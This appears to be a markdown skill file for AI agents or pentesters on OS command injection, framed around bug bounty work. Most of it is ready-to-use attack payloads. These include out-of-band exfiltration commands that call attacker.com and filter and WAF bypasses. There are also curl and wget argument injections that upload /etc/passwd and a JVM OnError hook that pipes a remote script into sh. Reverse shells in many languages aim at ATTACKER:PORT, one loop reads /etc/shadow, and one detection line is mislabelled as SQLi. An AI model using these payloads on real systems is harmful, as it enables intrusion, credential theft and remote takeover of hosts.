---
name: command-injection
description: ULTIMATE OS Command Injection methodology — detection, blind/OOB, filter bypass (space/keyword/character), WAF bypass, reverse shell staging, argument injection, Node.js exec vs execFile, JVM diagnostic RCE.
---

# OS Command Injection — THE COMPLETE GUIDE

## Decision Tree
```
1. Parameter injectable?
   ├── Output visible? → Classic command injection
   │   ├── Use ;, |, ||, &, &&, `cmd`, $(cmd), %0a
   │   └── Confirm via id, whoami, hostname, pwd
   ├── Timing diff? → Blind time-based SQLi
   │   ├── sleep 5, ping -c 10 127.0.0.1
   │   └── if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
   └── OOB callback? → Blind OOB exfiltration
       ├── nslookup `whoami`.attacker.com
       └── curl http://attacker.com/`whoami`

2. Context?
   ├── Injected in argument → Need to break quoting first
   ├── Injected in body → Direct command injection
   ├── Injected via header → May need HTTP request smuggling first
   └── Argument injection (argv) → Leading hyphen, no shell chars needed

3. Mitigation bypass needed?
   ├── Space filtered → ${IFS}, %09, %20, $@, {cmd,args}
   ├── Keyword filtered → $a$b, base64, hex, wildcard
   ├── Slash filtered → ${PATH:0:1}, $(echo . | cut -f1)
   └── Full blacklist → wildcard/globbing: /???/???t?
```

## Detection Payloads
```
# Command chaining operators
;    id           # Semicolon (execute both)
|    id           # Pipe (stdout of first → stdin of second)
||   id           # OR (execute second if first fails)
&&   id           # AND (execute second if first succeeds)
&    id           # Background (execute both, output order varies)
`id`              # Backtick command substitution (execute inline)
$(id)             # Dollar-parenthesis substitution (execute inline)
%0a id            # URL-encoded newline (execute new command)
%0a id %0a        # Newline with trailing newline

# Newline + tab encoding
ls%0abash%09-c%09"id"%0a

# No-space alternatives
${IFS}            # Internal Field Separator
%09               # Tab
{cmd,args}        # Bash brace expansion: {ls,-la}
$@                # Empty variable expansion
$<                # (in some shells)
```

## Blind Detection
```
# Time-based (adjust sleep duration)
sleep 5
ping -c 10 127.0.0.1
|| sleep 5 #
&& sleep 5 #

# Character-by-character timing exfiltration
if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi

# OOB (Out-of-band) DNS exfiltration
nslookup `whoami`.attacker.com
host `whoami`.attacker.com
curl http://attacker.com/`whoami`
ping -c 1 `whoami`.attacker.com
wget --post-data=`whoami` http://attacker.com/

# OOB tools: dnsbin.zhack.ca, interactsh-client, Burp Collaborator
```

## Filter Bypass Techniques

### Space Bypass
```
${IFS}                       # Tab/space: cat${IFS}/etc/passwd
%09                          # Tab: cat%09/etc/passwd
%20                          # URL-encoded space
$IFS$9                       # IFS + empty var
<                            # Input redirection: cat</etc/passwd
{,}                          # Brace expansion: {cat,/etc/passwd}
$@                           # Empty parameter: cat$@/etc/passwd
<<''                         # Here-doc
```

### Keyword/Command Blacklist Bypass
```
# Character concatenation
a=l;b=s;$a$b                # eval
/???/???t?                   # Globbing: /bin/cat (matches /bin/cat)
/???/c?t                     # /bin/cat
/???/n?                      # /bin/nc
/???/???/??ss?rd             # /usr/sbin/passwd

# Base64 encoding
echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash
$(echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d)

# Hex encoding
echo '636174202f6574632f706173737764' | xxd -r -p | bash

# Octal encoding
$'\143\141\164' /etc/passwd   # cat in octal

# Command substitution obfuscation
$(printf '\143\141\164') /etc/passwd

# Wildcard/globbing
/???/???t? /???/??ss?d       # cat /etc/passwd
/???/c?t /???/p?ss?d         # cat /etc/passwd
*/*/???/???t?                # find any cat binary

# Environment variable splitting
${PATH:0:1}                  # First char of PATH (usually /)
${HOME:0:1}                  # First char of HOME (usually /)

# Special variable tricks
$0                           # Shell name (bash/sh)
$(which id)                  # Path resolution
```

### Slash/Path Bypass
```
${PATH:0:1}                  # First char of PATH (usually /)
$(echo . | cut -f1)          # Returns empty but tricks parsers
$(expr substr $(pwd) 1 1)    # First char of pwd
$(printf /)                  # Prints /
```

### Quoting Bypass
```
# Break out of quoted strings
' ; id ; '
" ; id ; "
';id;'
";id;"
') ; id ; ('
" -a --exec id "
```

### Windows-Specific Bypass
```
# PowerShell bypass
powershell C:**2\n??e*d.*?     # notepad via globbing
@^p^o^w^e^r^shell c:**32\c*?c.e?e   # calc via caret escaping

# Windows command obfuscation
c^m^d                       # cmd.exe via caret escaping
whoami                      # whoami in quotes works
w%hoa%mi                    # Variable expansion (if var not set, removes %...%)
who^a^m^i                   # Caret escaping on Windows
```

## WAF / Detection Bypass
```
# Newline injection
%0a                          # URL-encoded newline
%0d%0a                       # CRLF (Windows-style newline)
%0a%0d                       # LFCR

# Tab between command and args
%09                          # Tab
%20                          # Space (often allowed)

# Case obfuscation
CaT /eTc/PaSsWd             # Some WAFs don't check case

# Comment injection
id$(echo)                    # Empty echo, but may break WAF regex
id$(echo%09)                 # Tab in substitution
id$(whoami)                  # Nested substitution

# Payload encoding
URL-encode (double)          # %2532 instead of %32 for hex sequences
Hex encoding                 # \x63\x61\x74
Unicode encoding             # \u0063\u0061\u0074
```

## Node.js child_process.exec vs execFile
```
# VULNERABLE: exec() spawns /bin/sh -c
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user}`, (err, stdout) => { });

# SECURE: execFile() uses execve, no shell
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', ['--id_user', id_user]);
```

Always check for `exec()`, `spawn()` with `{shell: true}`, or `popen()` calls — these spawn a shell and are injectable. `execFile()` and `spawn()` without `shell: true` are safe from shell metacharacters but may still be vulnerable to **argument injection**.

## Argument/Option Injection (No Shell Metacharacters Needed)
When user input is passed as **argv arguments** (via execFile, spawn without shell), many programs still interpret leading `-` or `--` as options. This allows:

```
# ping argument injection
-f                       # Flood ping (DoS)
-c 100000                # Packet count

# curl argument injection
-o /tmp/shell.sh         # Write output to file
-K /tmp/config           # Load config from file
-F file=@/etc/passwd     # Upload file
-d @/etc/passwd          # POST file content

# tcpdump argument injection
-G 1 -W 1 -z /path/script.sh   # Post-rotate script execution

# wget argument injection
--post-file=/etc/passwd         # Upload file
--directory-prefix=/var/www/    # Write to web root
```

## JVM Diagnostic Callback RCE
Any way to inject JVM arguments (`_JAVA_OPTIONS`, `AdditionalJavaArguments`, launcher config) can be turned into RCE via JVM error hooks:

```
# Force OOM then exec
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell ..."

# On JVM crash exec
-XX:OnError="/bin/sh -c 'curl -fsS https://attacker/p.sh | sh'"
-XX:+CrashOnOutOfMemoryError
```

No shell metacharacters needed — the JVM parses these directly.

## Top 25 Parameters to Test
```
cmd, exec, command, execute, ping, query, jump, code, reg, do, func,
arg, option, load, process, step, read, function, req, feature, exe,
module, payload, run, print
```

## Tool Methodology
```
# Commix automated testing
commix -u "http://target.com/page?param=test"

# FFUF for blind command injection detection
ffuf -u "http://target.com/page?param=testFUZZ" \
     -w /path/to/payloads.txt -t 50 -s

# DIY OOB detection with interactsh
interactsh-client -v

# Burp Intruder for blind detection
# Use Collaborator payloads in command injection parameters
```

## Reverse Shell Staging
```
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
exec 5<>/dev/tcp/ATTACKER/PORT;cat <&5|while read line;do $line 2>&5>&5;done

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Netcat
nc -e /bin/sh ATTACKER PORT       # Traditional
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f  # OpenBSD variant

# PHP
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER","PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# OpenSSL (when plain sockets blocked)
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER:PORT > /tmp/s; rm /tmp/s

# Powershell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"

# socat
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:PORT
```

## Time-Based Data Exfiltration
```
# Extract character by character
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi

# Iterate through password chars
for i in $(seq 1 32); do
  time if [ $(cat /etc/shadow|cut -c $i) == a ]; then sleep 2; fi
done
```

## DNS-Based Data Exfiltration
```
# Exfil via DNS
for i in $(ls /) ; do host "$i.UNIQUE_ID.burpcollaborator.net"; done

# Online tools: dnsbin.zhack.ca, interactsh-client, Burp Collaborator
```

## Evidence Collection for Bug Bounties
```
# Save raw request/response
cat > exploit/<finding-id>/request-N.txt << 'EOF'
POST /page HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

param=127.0.0.1%0aid
EOF

# Save command output
echo "id output: $(whoami)"

# Save reverse shell interaction log
script -q -c "nc -lvnp 4444" /tmp/shell.log

# Time-based evidence (show the delay)
time curl -s -o /dev/null -w "%{time_total}" "http://target.com/page?param=sleep%205"
```
